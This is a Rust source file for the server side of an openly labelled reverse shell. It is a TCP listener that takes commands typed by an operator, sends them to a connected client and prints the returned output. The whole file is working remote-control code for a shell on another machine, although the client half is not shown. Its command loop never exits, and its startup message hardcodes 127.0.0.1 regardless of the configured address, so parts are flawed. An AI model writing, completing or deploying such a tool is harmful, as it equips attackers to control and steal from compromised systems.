/*

A reverse shell written in Rust.
Copyright (C) 2022-2023 simonfalke, Sherlock Holmes, Admiral Canaris

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

pub mod server {
	use crate::Config;
	use std::io::prelude::*;
	use std::net::{TcpListener, TcpStream};

	fn send_message(stream: &mut TcpStream, message: &String) {
		stream.write(message.as_bytes()).unwrap();
		stream.flush().unwrap();
	}

	fn send_partial_output(stream: &mut TcpStream, output: &String) {
		send_message(stream, output);
		send_message(stream, &String::from("MESSAGEDONE"));
	}

	fn finish_output(stream: &mut TcpStream) {
		send_message(stream, &String::from("END"));
	}

	fn receive_message(stream: &mut TcpStream) -> String {
		let mut buffer = [0; 1024];
		stream.read(&mut buffer).unwrap();

		String::from_utf8_lossy(&buffer[..]).replace("\0", "")
	}

	fn receive_partial_output(stream: &mut TcpStream) -> String {
		let mut data = String::new();

		loop {
			let received = receive_message(stream);

			if received.trim() == "MESSAGEDONE" {
				break;
			} else if received.trim() == "END" {
				ask_recursively(stream);
			}

			data.push_str(&received);
		}

		data
	}

	fn get_command() -> String {
		let mut input = String::new();
		std::io::stdin().read_line(&mut input).unwrap();

		input
	}

	fn ask_recursively(stream: &mut TcpStream) {
		let command = get_command();

		send_message(stream, &command);

		loop {
			println!("{}", receive_partial_output(stream));
		}
	}

	fn handle_client(mut stream: TcpStream) {
		ask_recursively(&mut stream);
	}

	pub fn main(conf: Config) {
		let listener = TcpListener::bind(format!("{}:{}", conf.ip, conf.port.to_string())).unwrap();

		println!("Listening at 127.0.0.1 on port {}", conf.port);

		for stream in listener.incoming() {
			match stream {
				Ok(stream) => {
					handle_client(stream);
				}

				Err(e) => {
					println!("Error: {}", e);
				}
			}
		}
	}
}
